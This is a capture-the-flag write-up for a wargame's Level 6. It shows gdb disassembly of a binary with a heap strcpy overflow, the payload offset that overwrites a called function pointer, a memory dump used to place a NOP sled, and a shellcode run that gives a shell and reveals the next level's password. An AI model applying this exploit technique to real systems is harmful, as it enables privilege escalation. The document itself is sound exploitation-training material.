## Level 6

level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

main:
```
(gdb) disas main
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
```

Finding the offset to overrite `EAX`
```
(gdb) r $(python -c 'print("A"*72 + "BBBB")')
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Finding the address where we will inject our shellcode
```
(gdb) b *main + 84
(gdb) r $(python -c 'print("A"*72 + "BBBB" + "\x90"*128)')
(gdb) x/200x $esp
...
0xbffff840:     0x4100366c      0x41414141      0x41414141      0x41414141
0xbffff850:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff860:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff870:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff880:     0x41414141      0x41414141      0x42414141      0x90424242
0xbffff890:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff8a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff8b0:     0x90909090      0x90909090      0x90909090      0x90909090
...
```

We created `shellcode.py` to genrate a payload and passed is as argument to `./level6`.

Once executed, we got a shell as the user `level7`.
```
$ ./level6 $(python /tmp/shellcode.py)
$ whoami
level7
$ cat /home/user/level7/.pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
